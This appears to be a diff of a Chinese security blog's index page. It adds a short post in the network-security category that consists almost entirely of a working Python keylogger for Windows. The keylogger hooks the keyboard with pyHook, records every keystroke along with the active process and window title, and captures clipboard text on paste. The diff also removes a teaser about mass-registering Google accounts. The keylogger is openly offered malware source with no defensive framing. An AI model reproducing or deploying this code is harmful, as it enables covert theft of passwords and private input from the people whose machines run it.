@@ -305,6 +305,160 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://vksec.com/2018/02/01/29_python键盘记录器/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="vsyour">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="https://i.imgur.com/luMBjvD.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Openresty Python LUA">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2018/02/01/29_python键盘记录器/" itemprop="url">
+                  python 键盘记录器
+                </a>
+              
+            
+          </h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-02-01T03:03:03+08:00">
+                2018-02-01
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/网络安全/" itemprop="url" rel="index">
+                    <span itemprop="name">网络安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2018/02/01/29_python键盘记录器/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2018/02/01/29_python键盘记录器/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>python 键盘记录器代码如下:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-  </span></span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> pythoncom</span><br><span class="line"><span class="keyword">import</span> pyHook</span><br><span class="line"><span class="keyword">import</span> win32clipboard</span><br><span class="line"></span><br><span class="line">user32 = windll.user32</span><br><span class="line">kernel32 = windll.kernel32</span><br><span class="line">psapi = windll.psapi</span><br><span class="line">current_window = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_current_process</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 获取最上层的窗口句柄</span></span><br><span class="line">    hwnd = user32.GetForegroundWindow()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 获取进程ID</span></span><br><span class="line">    pid = c_ulong(<span class="number">0</span>)</span><br><span class="line">    user32.GetWindowThreadProcessId(hwnd,byref(pid))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将进程ID存入变量中</span></span><br><span class="line">    process_id = <span class="string">"%d"</span> % pid.value</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 申请内存</span></span><br><span class="line">    executable = create_string_buffer(<span class="string">"\x00"</span>*<span class="number">512</span>)</span><br><span class="line">    h_process = kernel32.OpenProcess(<span class="number">0x400</span> | <span class="number">0x10</span>,<span class="literal">False</span>,pid)</span><br><span class="line"></span><br><span class="line">    psapi.GetModuleBaseNameA(h_process,<span class="literal">None</span>,byref(executable),<span class="number">512</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 读取窗口标题</span></span><br><span class="line">    windows_title = create_string_buffer(<span class="string">"\x00"</span>*<span class="number">512</span>)</span><br><span class="line">    length = user32.GetWindowTextA(hwnd,byref(windows_title),<span class="number">512</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 打印</span></span><br><span class="line">    <span class="keyword">print</span> </span><br><span class="line">    <span class="keyword">print</span> <span class="string">"[ PID:%s-%s-%s]"</span> % (process_id,executable.value,windows_title.value)</span><br><span class="line">    <span class="keyword">print</span> </span><br><span class="line"></span><br><span class="line">    <span class="comment"># 关闭handles</span></span><br><span class="line">    kernel32.CloseHandle(hwnd)</span><br><span class="line">    kernel32.CloseHandle(h_process)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义击键监听事件函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">KeyStroke</span><span class="params">(event)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">global</span> current_window</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 检测目标窗口是否转移(换了其他窗口就监听新的窗口)</span></span><br><span class="line">    <span class="keyword">if</span> event.WindowName != current_window:</span><br><span class="line">        current_window = event.WindowName</span><br><span class="line">        <span class="comment"># 函数调用</span></span><br><span class="line">        get_current_process()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 检测击键是否常规按键（非组合键等）</span></span><br><span class="line">    <span class="keyword">if</span> event.Ascii &gt; <span class="number">32</span> <span class="keyword">and</span> event.Ascii &lt;<span class="number">127</span>:</span><br><span class="line">        <span class="keyword">print</span> chr(event.Ascii),</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># 如果发现Ctrl+v（粘贴）事件，就把粘贴板内容记录下来</span></span><br><span class="line">        <span class="keyword">if</span> event.Key == <span class="string">"V"</span>:</span><br><span class="line">            win32clipboard.OpenClipboard()</span><br><span class="line">            pasted_value = win32clipboard.GetClipboardData()</span><br><span class="line">            win32clipboard.CloseClipboard()</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"[PASTE]-%s"</span> % (pasted_value),</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"[%s]"</span> % event.Key,</span><br><span class="line">    <span class="comment"># 循环监听下一个击键事件</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建并注册hook管理器</span></span><br><span class="line">kl = pyHook.HookManager()</span><br><span class="line">kl.KeyDown = KeyStroke</span><br><span class="line"></span><br><span class="line"><span class="comment"># 注册hook并执行</span></span><br><span class="line">kl.HookKeyboard()</span><br><span class="line">pythoncom.PumpMessages()</span><br></pre></td></tr></table></figure>
+<p>参考:<br>python 键盘记录器<br><a href="http://blog.csdn.net/qq_16234613/article/details/79151528" target="_blank" rel="noopener">http://blog.csdn.net/qq_16234613/article/details/79151528</a></p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
     <link itemprop="mainEntityOfPage" href="http://vksec.com/2018/02/01/31_selenium使用实例/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1707,162 +1861,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://vksec.com/2018/01/29/26_大量注册gmail账号/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="vsyour">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="https://i.imgur.com/luMBjvD.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Openresty Python LUA">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h2 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2018/01/29/26_大量注册gmail账号/" itemprop="url">
-                  奇技淫巧：手工注册大量google账号的方法
-                </a>
-              
-            
-          </h2>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-01-29T03:03:03+08:00">
-                2018-01-29
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/gmail/" itemprop="url" rel="index">
-                    <span itemprop="name">gmail</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-              <span class="post-comments-count">
-                <span class="post-meta-divider">|</span>
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-comment-o"></i>
-                </span>
-                <a href="/2018/01/29/26_大量注册gmail账号/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2018/01/29/26_大量注册gmail账号/" itemprop="commentCount"></span>
-                </a>
-              </span>
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          <p>奇技淫巧：手工注册大量google账号的方法<br>QQ群：397745473</p>
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2018/01/29/26_大量注册gmail账号/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
   </section>
 
   
@@ -1910,7 +1908,7 @@
           
             <div class="site-state-item site-state-posts">
               <a href="/archives">
-                <span class="site-state-item-count">175</span>
+                <span class="site-state-item-count">176</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
